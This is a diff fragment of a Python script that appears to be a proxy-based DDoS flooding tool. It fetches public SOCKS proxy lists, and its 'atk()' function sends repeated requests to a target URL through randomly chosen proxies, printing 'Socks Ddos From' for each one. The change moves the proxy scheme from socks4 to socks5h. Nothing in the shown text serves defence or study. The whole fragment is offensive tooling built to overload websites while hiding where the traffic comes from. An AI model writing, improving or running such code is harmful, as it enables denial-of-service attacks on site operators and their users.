@@ -38,7 +38,7 @@ def main():
 	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
 	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
-		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&anonymity=elite&ssl=yes')
+		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=elite&ssl=yes')
 		with open('socks.txt','wb') as fp:
 			fp.write(rsp.content)
 			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
@@ -56,8 +56,8 @@ def atk():
 		proxy = random.choice(pprr).strip().split(":")
 		s = requests.session()
 		s.proxies = {}
-		s.proxies['http'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
-		s.proxies['https'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
+		s.proxies['http'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
+		s.proxies['https'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
 		try:
 			s.get(url)
 			print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
